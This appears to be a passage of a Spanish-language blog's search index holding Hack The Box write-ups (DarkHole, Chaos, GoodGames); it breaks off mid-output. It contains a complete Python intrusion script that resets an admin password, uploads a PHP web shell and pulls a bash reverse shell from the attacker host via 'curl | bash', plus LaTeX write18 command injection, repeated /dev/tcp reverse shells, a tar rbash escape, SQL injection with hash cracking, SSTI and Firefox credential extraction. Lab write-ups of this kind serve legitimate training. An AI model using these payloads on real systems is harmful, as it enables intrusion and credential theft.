4096 Feb 20 17:02 .drwxr-xr-x 4 root root      4096 Jul 16  2021 ..-rw------- 1 john john      2485 Feb 20 20:34 .bash_history-rw-r--r-- 1 john john       220 Jul 16  2021 .bash_logout-rw-r--r-- 1 john john      3771 Jul 16  2021 .bashrcdrwx------ 2 john john      4096 Jul 17  2021 .cache-rwxrwx--- 1 john john        43 Feb 20 17:02 file.pyVemos que el archivo file.py nos pertenece a nosotros, por lo tanto, ganar acceso como root será muy sencillo.Para ello vamos a brir el archivo y utilizando la libraria os vamos a ejecutar un comando en el sistema, lo que podemos hacer es asignarle el privilegio SUID a la bash de root, para que podamos convertinos en él, como el archivo lo está ejecutando root haremos lo siguiente:import osos.system(\"chmod +s /bin/bash\")Y lo guardamos.Vamos a ejecutarlo:bash-5.0$ sudo /usr/bin/python3 /home/john/file.pySi vemos los permisos de /bin/bash:bash-5.0$ ls -la /bin/bash-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bashVemos que ahora es SUID, vamos a ejecutarlo:bash-5.0$ bash -pbash-5.0# whoamirootbash-5.0# cat root.txtDarkHole{You_Are_Legend}¡Listo!, nos convertimos en root, hemos terminado la máquina.Sin embargo, como un extra como a realizar la automatización de la intrusión en python.En primer lugar, vamos a definir las variables que utilizaremos:ipHost= sys.argv[1]ipVic= sys.argv[2]urlIndex = f'http://{ipVic}/dashboard.php?id=2' # Modificar id si ya has creado usuarios.urlAdmin = f'http://{ipVic}/dashboard.php?id=1'urlRegister= f'http://{ipVic}/register.php'urlLogin= f'http://{ipVic}/login.php'usr= \"testo\"passw= \"testo\"s = requests.Session()Tenemos la función que se encarga de registrar un usuario:def register():    post_data = {         \"username\": f'{usr}',        \"email\": f'{usr}%20{usr}',        \"password\": f'{passw}'     }    r = s.post(urlRegister,data=post_data)    print(\"[+] Usuario creado\")La siguiente de iniciar sesión:def login():    post_data = {        \"username\": f'{usr}',       \"password\": f'{passw}'     }    r = s.post(urlLogin,data=post_data)La que sigue se encarga de cambiarle la contraseña al usuario admin:def changePass():    post_data= {        \"password\": \"password\",        \"id\": \"1\"    }    r = s.post(urlIndex,data=post_data)    print(\"[+] Contraseña de admin cambiada con éxito\")Luego, tenemos el inicio de sesión como admin:def loginadmin():     post_data = {        \"username\": \"admin\",       \"password\": \"password\"     }     r = s.post(urlLogin,data=post_data)La siguiente función se encarga de subir el archivo malicioso a la máquina víctima:def upload():        payload = \"\"\"  &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_REQUEST['cmd']) . \"&lt;/pre&gt;\"; ?&gt; \"\"\"         files  = {'fileToUpload':('shell.phtml',payload)            }        print(\"[+] Subiendo archivo malicoso\")        r = s.post(urlAdmin,files=files)Finalmente, tenemos la función que crea el index.html y el servidor http:def html_payload():    with open(\"index.html\",\"w\") as file:        Shebang = \"#!/bin/bash\\n\"        payload =f'bash -i &gt;&amp; /dev/tcp/{ipHost}/1234 0&gt;&amp;1'        file.write(Shebang)        file.write(payload)def http_server():    try:        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as so:            so.bind(('localhost', 80))            http_server = subprocess.Popen([\"python3\", \"-m\", \"http.server\", \"80\"])    except OSError:            print(\"\\n[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor\")Si lo ejecutamos:python subida.py 192.168.233.128 192.168.233.129[!] Asegurarse de no haber creado ningún usuario, en caso contrario modificar el id en urlIndex[+] Usuario creado[+] Contraseña de admin cambiada con éxito[+] Subiendo archivo malicoso[+] Trying to bind to :: on port 1234: Done[+] Waiting for connections on :::1234: Got connection from ::ffff:192.168.233.129 on port 60244[*] Switching to interactive modebash: cannot set terminal process group (88930): Inappropriate ioctl for devicebash: no job control in this shellbash-5.0$ $ whoamiwhoamiwww-dataEl código completo es este:import requests,subprocess,socketfrom pwn import *def def_handler(sig, frame):    print(\"\\n\\n[!] saliendo...\\n\")    sys.exit(1)signal.signal(signal.SIGINT, def_handler)if len(sys.argv) &lt; 3:    print(f'[!] Uso: python3 {sys.argv[0]} \"Tu IP\"  \"Ip de la víctima\"\\n' )    sys.exit(1)print(\"[!] Asegurarse de no haber creado ningún usuario, en caso contrario modificar el id en urlIndex\")sleep(1)ipHost= sys.argv[1]ipVic= sys.argv[2]urlIndex = f'http://{ipVic}/dashboard.php?id=2' # Modificar id si ya has creado usuarios.urlAdmin = f'http://{ipVic}/dashboard.php?id=1'urlRegister= f'http://{ipVic}/register.php'urlLogin= f'http://{ipVic}/login.php'usr= \"testo\"passw= \"testo\"s = requests.Session()def register():    post_data = {         \"username\": f'{usr}',        \"email\": f'{usr}%20{usr}',        \"password\": f'{passw}'     }    r = s.post(urlRegister,data=post_data)    print(\"[+] Usuario creado\")def login():    post_data = {        \"username\": f'{usr}',       \"password\": f'{passw}'     }    r = s.post(urlLogin,data=post_data)def changePass():    post_data= {        \"password\": \"password\",        \"id\": \"1\"    }    r = s.post(urlIndex,data=post_data)    print(\"[+] Contraseña de admin cambiada con éxito\")def loginadmin():     post_data = {        \"username\": \"admin\",       \"password\": \"password\"     }     r = s.post(urlLogin,data=post_data)def upload():        payload = \"\"\"  &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_REQUEST['cmd']) . \"&lt;/pre&gt;\"; ?&gt; \"\"\"         files  = {'fileToUpload':('shell.phtml',payload)            }        print(\"[+] Subiendo archivo malicoso\")        r = s.post(urlAdmin,files=files)def html_payload():    with open(\"index.html\",\"w\") as file:        Shebang = \"#!/bin/bash\\n\"        payload =f'bash -i &gt;&amp; /dev/tcp/{ipHost}/1234 0&gt;&amp;1'        file.write(Shebang)        file.write(payload)def http_server():    try:        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as so:            so.bind(('localhost', 80))            http_server = subprocess.Popen([\"python3\", \"-m\", \"http.server\", \"80\"])    except OSError:            print(\"\\n[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor\")def conection():    ip = f'http://{ipVic}/upload/shell.phtml?cmd=curl%20{ipHost}%20|%20bash'    r = s.get(ip)if __name__ == '__main__':    html_payload()    http_server()    sleep(1)    register()    login()    changePass()    loginadmin()    upload()    threading.Thread(target=conection, args=()).start()    shell = listen(1234,timeout=20).wait_for_connection()    shell.interactive()¡Listo! Hemos terminado la automatización de la intrusión.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "Chaos HTB Write-up",
    "url": "/posts/Chaos/",
    "categories": "Write up, Hack The Box",
    "tags": "Enumeration, Web, Fuzzing, Weak password, Mail abusing, Restricted bash bypass, Extracting Credentials from browser, Linux, Medium",
    "date": "2023-02-17 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Chaos, la cual tiene una dificultad media. Para lograr vulnerarla realizaremos lo siguiente:  Fuzzing de dire...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Chaos, la cual tiene una dificultad media. Para lograr vulnerarla realizaremos lo siguiente:  Fuzzing de directorios web.  Adivinar credenciales demasiado débiles.  Utilización de claws-mail (abusando de email).  Decrypt de un mensaje.  Restricted bash bypass.  Extracción de credenciales de una sesión de navegador.Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.10.120PING 10.10.10.120 (10.10.10.120) 56(84) bytes of data.64 bytes from 10.10.10.120: icmp_seq=1 ttl=63 time=144 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap -p- -sS --open -min-rate 5000 10.10.10.120 -oG PortAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT      STATE SERVICE80/tcp    open  http110/tcp   open  pop3143/tcp   open  imap993/tcp   open  imaps995/tcp   open  pop3s10000/tcp open  snet-sensor-mgmtRealizamos un escaneo de los servicios expuestos utilizando nmap:nmap -sCV -p80,110,143,993,995,10000 10.10.10.120 -oN ServiceScanComo resultado del escaneo tenemos:PORT      STATE SERVICE  VERSION80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))|_http-server-header: Apache/2.4.34 (Ubuntu)|_http-title: Site doesn't have a title (text/html).110/tcp   open  pop3     Dovecot pop3d|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=chaos| Subject Alternative Name: DNS:chaos| Not valid before: 2018-10-28T10:01:49|_Not valid after:  2028-10-25T10:01:49|_pop3-capabilities: STLS PIPELINING SASL TOP UIDL AUTH-RESP-CODE RESP-CODES CAPA143/tcp   open  imap     Dovecot imapd (Ubuntu)|_imap-capabilities: IMAP4rev1 more OK LITERAL+ have IDLE LOGIN-REFERRALS SASL-IR listed capabilities Pre-login LOGINDISABLEDA0001 post-login ID ENABLE STARTTLS| ssl-cert: Subject: commonName=chaos| Subject Alternative Name: DNS:chaos| Not valid before: 2018-10-28T10:01:49|_Not valid after:  2028-10-25T10:01:49|_ssl-date: TLS randomness does not represent time993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)|_imap-capabilities: IMAP4rev1 OK LITERAL+ more IDLE LOGIN-REFERRALS have AUTH=PLAINA0001 capabilities listed ENABLE post-login ID SASL-IR Pre-login| ssl-cert: Subject: commonName=chaos| Subject Alternative Name: DNS:chaos| Not valid before: 2018-10-28T10:01:49|_Not valid after:  2028-10-25T10:01:49|_ssl-date: TLS randomness does not represent time995/tcp   open  ssl/pop3 Dovecot pop3d|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=chaos| Subject Alternative Name: DNS:chaos| Not valid before: 2018-10-28T10:01:49|_Not valid after:  2028-10-25T10:01:49|_pop3-capabilities: USER PIPELINING SASL(PLAIN) TOP UIDL AUTH-RESP-CODE RESP-CODES CAPA10000/tcp open  http     MiniServ 1.890 (Webmin httpd)|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelObservamos un montón de protocolos de email que los veremos después, vemos el puerto 80 con un servicio http, por lo tanto, vamos a usar whatweb para enumerar información:whatweb 10.10.10.120http://10.10.10.120 [200 OK] Apache[2.4.34], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.34 (Ubuntu)], IP[10.10.10.120]No vemos casi nada, vamos a revisar la web:Observamos que no hay nada, sin embargo, leyendo lo que dice quizás se está aplicando virtual hosting y tenemos que entrar por un dominio, para ello tenemos que encontrar como se llama.Si nos fijamos en la captura de nmap: ssl-cert: Subject: commonName=chaos| Subject Alternative Name: DNS:chaosVemos el dominio chaos, por convenio normalmente siempre terminan en .htb así que vamos a introducir todo eso en el /etc/hosts:127.0.0.1       localhost127.0.1.1       kali::1             localhost ip6-localhost ip6-loopbackff02::1         ip6-allnodesff02::2         ip6-allrouters10.10.10.120    chaos.htbCon esto listo, vamos a ver la web:Ahora si, por lo tanto, se estaba aplicando virutal hosting.Si inspeccionamos la web no encontramos nada de utilidad, por mientras vamos a fuzzear directorios utilizando wfuzz:wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 http://chaos.htb/FUZZVamos a investigar el otro puerto http:Vamos a ingresar donde nos dicen:Encontramos un panel de webmin, sin embargo, no podemos hacer mucho (podría pensarse en shelllock porque es .cgi pero no es el caso).Si volvemos al fuzzing, no encontramos nada de interés.Pero como se está aplicando virtual hosting vamos a fuzzear por la dirección ip:wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 http://10.10.10.120/FUZZEncontramos algo:000000793:   301        9 L      28 W       309 Ch      \"wp\" Podría tratarse de una de las direcciones de WordPress, vamos a verlo:Encontramos una página con directory listing, si hacemos click en wordpress nos redirige hacia otra página:ExplotaciónVemos una sección donde pide contraseña, vamos a poner las típicas como password, pass, pero no hay resultado, si hacemos click en el post:Vemos el nombre del autor del post human, como último intento manual utilizaremos human:Vemos que esa era la contraseña, nos da unas credenciales de webmail, vamos a probarlas, para ello haremos uso de claws-mail para intentar conectados por imap:Ingresamos la información que tenemos y entramos:Vemos que tenemos varias carpetas, vamos a ir entrando una por una:Encontramos un mail donde envía un archivo encriptado y el código con el que lo enviaron. Vamos a revisarlo:def encrypt(key, filename):    chunksize = 64*1024    outputFile = \"en\" + filename    filesize = str(os.path.getsize(filename)).zfill(16)    IV =Random.new().read(16)    encryptor = AES.new(key, AES.MODE_CBC, IV)    with open(filename, 'rb') as infile:        with open(outputFile, 'wb') as outfile:            outfile.write(filesize.encode('utf-8'))            outfile.write(IV)            while True:                chunk = infile.read(chunksize)                if len(chunk) == 0:                    break                elif len(chunk) % 16 != 0:                    chunk += b' ' * (16 - (len(chunk) % 16))                outfile.write(encryptor.encrypt(chunk))def getKey(password):            hasher = SHA256.new(password.encode('utf-8'))            return hasher.digest()Sin embargo, no buscaremos la forma de crear el decrypt, vamos a buscarlo por internet, encontramos este github que salió con nuestra búsqueda, la cual fue copypaste del código.Vamos a utilizar el decrypt.py:python decrypt.pyEnter filename: enim_msg.txtEnter password: sahayEsto nos crea un archivo:cat im_msg.txtSGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gKQue es en base64, asi que lo vamos a decodear:base64 -d im_msg.txtHii SahayPlease check our new service which create pdfp.s - As you told me to encrypt important msg, i did :)http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3Thanks,AyushVemos que al parecer hay un servicio para crear pdf y nos dan el directorio, vamos a verlo:Si hacemos pruebas no vemos nada, vamos a intentar fuzzear este directorio por si encontramos alguna parte donde se puedan ver los pdf creados:wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/FUZZEncontramos varios:000000222:   301        9 L      28 W       331 Ch      \"doc\"00000013:   200        54 L     147 W      2656 Ch     \"#\"                                                                                                                                               000000651:   301        9 L      28 W       334 Ch      \"source\"                                                                                                                                          000000081:   301        9 L      28 W       337 Ch      \"templates\"                                                                                                                                       000000143:   301        9 L      28 W       331 Ch      \"pdf\"                                                                                                                                             000014361:   301        9 L      28 W       331 Ch      \"texHay uno llamado doc, si nos metemos:Encontramos cosas de Latex, será que hacen los documentos con ello?Vamos al más interesante que se llama pdf:Encontramos un montón de pdf, acá debe ser donde se almacenan, vamos a crear un pdf con la palabra hola y buscaremos si está aquí:Efectivamente, se encuentra el pdf, vamos a analizar la petición por burpsuite:Vemos que si están empleando latex para crear los documentos, vamos a buscar formas de aprovecharnos de eso.Vemos que hay una forma de ejecutar comandos, vamos a utilizar este:\\immediate\\write18{id}Observamos que tenemos ejecución remota de comandos, vamos entonces a ganar acceso al sistema.Esto lo realizaremos como siempre, compartiendo un index.html malicioso por un servidor http con python, haremos que la máquina víctima intente acceder a ese recurso y lo pipee con bash, mientras escuchamos conexión por netcat:index.html:#!/bin/bashbash -i &gt;&amp; /dev/tcp/10.10.14.17/1234 0&gt;&amp;1Vamos a mandar el comando:En nuestro servidor en python:python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.10.120 - - [17/Feb/2023 16:26:33] \"GET / HTTP/1.1\" 200 -Y en el netcat:nc -nvlp 1234listening on [any] 1234 ...connect to [10.10.14.17] from (UNKNOWN) [10.10.10.120] 59318bash: cannot set terminal process group (1069): Inappropriate ioctl for devicebash: no job control in this shellwww-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ Tenemos acceso al sistema.Pero no tenemos acceso a las carpetas, pero recordamos que tenemos una credencial de ayush, vamos a ver si la han reutilizado:www-data@chaos:/home$ su ayushPassword: ayush@chaos:/home$ Vamos a ver la flag:rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command namesayush@chaos:/home$ Sin embargo, no podemos debido a que tenemos la bash restringida, si hacemos doble tab:ayush@chaos:/home$ !                         break                     coproc                    esac                      getopts                   mapfile                   set                       true./                        builtin                   declare                   eval                      hash                      ping                      shift                     type:                         caller                    dir                       exec                      help                      popd                      shopt                     typeset[                         case                      dirs                      exit                      history                   printf                    source                    ulimit[[                        cd                        disown                    export                    if                        pushd                     suspend                   umask]]                        command                   do                        false                     in                        pwd                       tar                       unalias{                         command_not_found_handle  done                      fc                        jobs                      read                      test                      unset}                         compgen                   echo                      fg                        kill                      readarray                 then                      untilalias                     complete                  elif                      fi                        let                       readonly                  time                      waitbg                        compopt                   else                      for                       local                     return                    times                     whileVemos todos los que podemos utilizar, hay uno en especial que es bastante interesante, corresponde al tar, pues si buscamos en la página web de GTFobins encontramos con que tar permite dar una shell, en este caso los permitiría saltarnos la rbash:ayush@chaos:/home$ tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bashtar: Removing leading `/' from member namesbash: groups: command not foundSi intentamos realizar un comando:ayush@chaos:/home$ lsCommand 'ls' is available in '/bin/ls'The command could not be located because '/bin' is not included in the PATH environment variable.Vemos que ya no tenemos resticción, sin embargo, faltan rutas en el path, por lo tanto, vamos a cambiar eso:ayush@chaos:/home$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/gamesUtilizamos la variable path de nuestro equipo.Ahora intentamos realizar comando:ayush@chaos:/home$ cd ayush/ayush@chaos:~$ ls -latotal 40drwx------ 6 ayush ayush 4096 Feb 17 20:43 .drwxr-xr-x 4 root  root  4096 Jun 30  2022 ..drwxr-xr-x 2 root  root  4096 Jun 30  2022 .applrwxrwxrwx 1 root  root     9 Jul 12  2022 .bash_history -&gt; /dev/null-rw-r--r-- 1 ayush ayush  220 Oct 28  2018 .bash_logout-rwxr-xr-x 1 root  root    22 Oct 28  2018 .bashrcdrwx------ 3 ayush ayush 4096 Feb 17 20:43 .gnupgdrwx------ 3 ayush ayush 4096 Feb 17 20:47 maildrwx------ 4 ayush ayush 4096 Jun 30  2022 .mozilla-rw-r--r-- 1 ayush ayush  807 Oct 28  2018 .profile-rw------- 1 ayush ayush   33 Feb 17 18:41 user.txtVemos que ya podemos realizar todo con comodidad y nos hemos saltado le rbash.Vemos algo interesante, el .mozilla, pero ahora vamos a ver la flag de usuario:ayush@chaos:~$ cat user.txteeca3d989309ee3028a35¡Bien! tenemos la flag, ahora tenemos que escalar privilegios.Escalada de privilegiosVimos un directorio firefox, antes de realizar otra cosa vamos a revisarlo, pues podrían existir cosas interesantes:ayush@chaos:~/.mozilla/firefox$ ls bzo7sjt1.default  'Crash Reports'   profiles.iniVemos que hay una sesión, podría existir información que nos interese.Si filtramos por ejemplo por password:ayush@chaos:~/.mozilla/firefox/bzo7sjt1.default$ grep -r -i password 2&gt;/dev/nullBinary file webappsstore.sqlite matcheslogins.json:{\"nextId\":3,\"logins\":[{\"id\":2,\"hostname\":\"https://chaos.htb:10000\",\"httpRealm\":null,\"formSubmitURL\":\"https://chaos.htb:10000\",\"usernameField\":\"user\",\"passwordField\":\"pass\",\"encryptedUsername\":\"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDSAazrlUMZFBAhbsMDAlL9iaw==\",\"encryptedPassword\":\"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNx7bW1TuuCuBBAP8YwnxCZH0+pLo6cJJxnb\",\"guid\":\"{cb6cd202-0ff8-4de5-85df-e0b8a0f18778}\",\"encType\":1,\"timeCreated\":1540642202692,\"timeLastUsed\":1540642202692,\"timePasswordChanged\":1540642202692,\"timesUsed\":1}],\"disabledHosts\":[],\"version\":2}Binary file key4.db matchesVemos cosas, asi que vamos a utilizar una heramienta llamada firefox decrypt que está en github esto nos permitirá extraer las contraseñas que se encuentren almacenadas.Vamos primero a abrir un servidor http con python en la máquina víctima y vamos a descargar todo lo que está en ese directorio.ayush@chaos:~/.mozilla/firefox/bzo7sjt1.default$ python3 -m http.server 8000Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)Luego, en nuestras máquina:wget -r chaos.htb:8000--2023-02-17 17:37:11--  http://chaos.htb:8000/Resolving chaos.htb (chaos.htb)... 10.10.10.120Connecting to chaos.htb (chaos.htb)|10.10.10.120|:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 2983 (2.9K) [text/html]Saving to: ‘chaos.htb:8000/index.html’chaos.htb:8000/index.html                            100%[=====================================================================================================================&gt;]   2.91K  --.-KB/s    in 0.002s  Lo descargaremos todo.Luego, vamos a utiliar el script dandole la ruta donde están los archivos:python3 firefox_decrypt.py ../chaos.htb:80002023-02-17 17:38:57,539 - WARNING - profile.ini not found in ../chaos.htb:80002023-02-17 17:38:57,539 - WARNING - Continuing and assuming '../chaos.htb:8000' is a profile locationMaster Password for profile ../chaos.htb:8000: Nos pide una contraseña, vamos a introducir la que sabemos:python3 firefox_decrypt.py ../chaos.htb:80002023-02-17 17:39:35,187 - WARNING - profile.ini not found in ../chaos.htb:80002023-02-17 17:39:35,188 - WARNING - Continuing and assuming '../chaos.htb:8000' is a profile locationMaster Password for profile ../chaos.htb:8000: Website:   https://chaos.htb:10000Username: 'root'Password: 'Thiv8wrej~'Y ha funcionado, tenemos un usuario y contraseña, vamos a probarlas:ayush@chaos:~/.mozilla/firefox/bzo7sjt1.default$ su rootPassword: root@chaos:/home/ayush/.mozilla/firefox/bzo7sjt1.default# cd /root/root@chaos:~# cat root.txte893768eae0135bb85dfeb75¡Listo! Nos convertimos en root, hemos terminado la máquina.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "GoodGames HTB Write-up",
    "url": "/posts/GoodGames/",
    "categories": "Write up, Hack The Box",
    "tags": "Enumeration, SQLi, SSTI, Manual scanning, Docker breakout, Linux, Easy",
    "date": "2023-02-16 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada GoodGames, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  SQLi basada ...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada GoodGames, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  SQLi basada en error.  SSTI.  Escaneo de puertos manual.  Escape de contenedor.  Utilización de contenedor para escalar privilegios.Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.11.130PING 10.10.11.130 (10.10.11.130) 56(84) bytes of data.64 bytes from 10.10.11.130: icmp_seq=1 ttl=63 time=142 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap -p- -sS --open -min-rate 5000 10.10.11.130 -oG PortAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT   STATE SERVICE80/tcp open  httpRealizamos un escaneo de los servicios expuestos utilizando nmap:sudo nmap -sCV -p80 10.10.11.130 -oN ServiceScanComo resultado del escaneo tenemos:PORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.51|_http-title: GoodGames | Community and Store|_http-server-header: Werkzeug/2.0.2 Python/3.9.2Service Info: Host: goodgames.htbObservamos goodgame.htb, vamos a agregarlo al /etc/hosts por si se aplica un virtual hosting:127.0.0.1       localhost127.0.1.1       kali::1             localhost ip6-localhost ip6-loopbackff02::1         ip6-allnodesff02::2         ip6-allrouters10.10.11.130    goodgames.htbVamos el servidor http, vamos a utilizar whatweb para ver que información recolecta:whatweb 10.10.11.130http://10.10.11.130 [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.9.2], IP[10.10.11.130], JQuery, Meta-Author[_nK], PasswordField[password], Python[3.9.2], Script, Title[GoodGames | Community and Store], Werkzeug[2.0.2], X-UA-Compatible[IE=edge]Podemos ver que utiliza python, además de werkzeug, el nombre de flask llega a nosotros.Bien, vamos a ver la web:Observamos una página de venta de juegos, si la analizamos no encontramos nada, todo redirige hacia arriba. Sin embargo, tenemos dos secciones, la de blog:Y una zona de tienda:Para la página de blog, el imput tampoco funciona, asi que nos queda la parte de la tienda, la cual tampoco nos dice mucho.Queda lo último, lo más interesante que es un panel de login:ExplotaciónVamos a analizar esto en Burpsuite:Si intentamos hacer una injección básica de sql, vemos que nos hemos logeado correctamente, asi que vamos a inspeccionar la página logeados:Vemos una nueva sección de configuración arriba, vamos a entrar:Pero no tenemos credenciales para esto. Vamos a volver con la injección sql, vamos a intentar enumerar la base de datos. En primer lugar, vamos a ver el número de columnas que tiene la tabla, esto lo haremos utilizando order by y fijándonos en el el campo length de la petición, el cual debería cambiar de acuerdo a las respuestas:Vamos a ir disminuyendo el número a ver si encontramos diferencias:Un poco más:Más:Podemos ver entonces que con 4 columnas ha cambiado el length de la respuesta, lo que nos quiere decir que deberían ser el total en esta tabla. Vamos a ver:Vamos a enumerar información ahora que podemos:Podemos ver que el nombre de la base de datos es main, por lo tanto, vamos a enumerar lo que contiene:Observamos lo que parecen ser varios nombres de tablas, no sabemos bien pero podemos intuir en base a la experiencia que deben ser blog, blog_comment y user.Vamos a probar, la tabla user siempre es algo interesante que ver pues puede tener credenciales:Observamos que hay dentro de la tabla y encontramos que tiene id, email, password y name. Vamos a intentar obtener lo que hay dentro de esta tabla:Utilizando el groups_concat obtenemos lo que quieremos, en este caso name y contraseña (3a es el : en hexadecimal). Obsevamos dos resultados porque creé una cuenta, sin embargo, esto no sirvió para nada.Tenemos el nombre admin y lo que parece ser un hash, vamos a ver si se trata de uno:hash-identifier \"2b22337f218b2d82dfc3b6f77e7cb8ec\"   #########################################################################   #     __  __                     __           ______    _____           #   #    /\\ \\/\\ \\                   /\\ \\         /\\__  _\\  /\\  _ `\\         #   #    \\ \\ \\_\\ \\     __      ____ \\ \\ \\___     \\/_/\\ \\/  \\ \\ \\/\\ \\        #   #     \\ \\  _  \\  /'__`\\   / ,__\\ \\ \\  _ `\\      \\ \\ \\   \\ \\ \\ \\ \\       #   #      \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\      \\_\\ \\__ \\ \\ \\_\\ \\      #   #       \\ \\_\\ \\_\\ \\___ \\_\\/\\____/  \\ \\_\\ \\_\\     /\\_____\\ \\ \\____/      #   #        \\/_/\\/_/\\/__/\\/_/\\/___/    \\/_/\\/_/     \\/_____/  \\/___/  v1.2 #   #                                                             By Zion3R #   #                                                    www.Blackploit.com #   #                                                   Root@Blackploit.com #   #########################################################################--------------------------------------------------Possible Hashs:[+] MD5[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))Vemos que se puede tratar de MD5, vamos a intentar romperlo con john:john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5Using default input encoding: UTF-8Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])Warning: no OpenMP support for this hash type, consider --fork=4Press 'q' or Ctrl-C to abort, almost any other key for statussuperadministrator (?)     1g 0:00:00:00 DONE (2023-02-16 10:25) 5.882g/s 20448Kp/s 20448Kc/s 20448KC/s superarely1993..super_havenUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliablySession completed. Tenemos la contraseña y el usuario, nos vamos a dirigir al panel de autenticación e intentar entrar:Hemos entrado correctamente al panel de flask, si nos dirigimos al panel de configuración encontramos una forma de cambiarse el nombre, vamos a cambiarlo a test:Vemos reflejado nuestro imput allí, como está python y flask vamos a intentar realizar un SSTI:Si lo enviamos:Observamos que es vulnerable a SSTI, iremos a la página de PayloadsAllTheThings encontraremos un montón, en nuestro caso será jinja2 porque utiliza python y flask, si lo usamos:Observamos que el comando se ejecutó correctamente, ahora vamos a ganar acceso a la máquina. Abriremos un servidor en python compartiendo un index.html malicioso, mientras esperamos con netcat una conexión, en el SSTI vamos a realizar una petición a nuesto recurso y pipearlo con bash para así ganar acceso al sistema:El archivo html es:#!/bin/bashbash -i &gt;&amp; /dev/tcp/10.10.14.17/1234 0&gt;&amp;1Luego, en el servidor web:Si hacemos la petición:python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.130 - - [16/Feb/2023 10:38:51] \"GET / HTTP/1.1\" 200 -Si vemos el netcat:rlwrap nc -nvlp 1234listening on [any] 1234 ...connect to [10.10.14.17] from (UNKNOWN) [10.10.11.130] 53968bash: cannot set terminal process group (1): Inappropriate ioctl for devicebash: no job control in this shellroot@3a453ab39d3d:/backend# whoamiwhoamirootObservamos que ha llegado la conexión y somos root, sin embargo, si nos fijamos:root@3a453ab39d3d:/backend# ifconfigifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)        RX packets 2904  bytes 457936 (447.2 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 2481  bytes 3969428 (3.7 MiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: 